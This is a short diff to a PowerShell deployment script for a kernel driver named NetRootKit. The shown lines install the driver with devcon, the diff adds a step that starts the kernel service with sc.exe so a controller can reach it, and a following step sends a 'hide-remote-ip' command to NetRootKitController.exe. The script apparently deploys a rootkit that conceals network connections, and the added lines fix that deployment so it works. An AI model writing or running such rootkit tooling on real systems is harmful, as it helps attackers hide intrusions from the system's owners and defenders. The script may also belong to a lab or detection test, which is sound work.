@@ -102,6 +102,12 @@ if (-not (Test-Path "NetRootKit.inf")) {
 $devconOutput = .\devcon.exe install NetRootKit.inf Root\NetRootKit
 Write-Host $devconOutput
 
+# IMPORTANT: devcon install registers the service, but it is set to SERVICE_DEMAND_START
+# We must manually start the kernel service so the Controller can get a handle to it.
+Write-Host "[*] Starting the NetRootKit kernel service..."
+sc.exe start NetRootKit | Out-Null
+Start-Sleep -Seconds 2
+
 # --- 7. Interact with Kernel Driver to Hide IP ---
 Write-Host "[*] Sending hide-remote-ip command to NetRootKitController..."
 if (-not (Test-Path "NetRootKitController.exe")) {
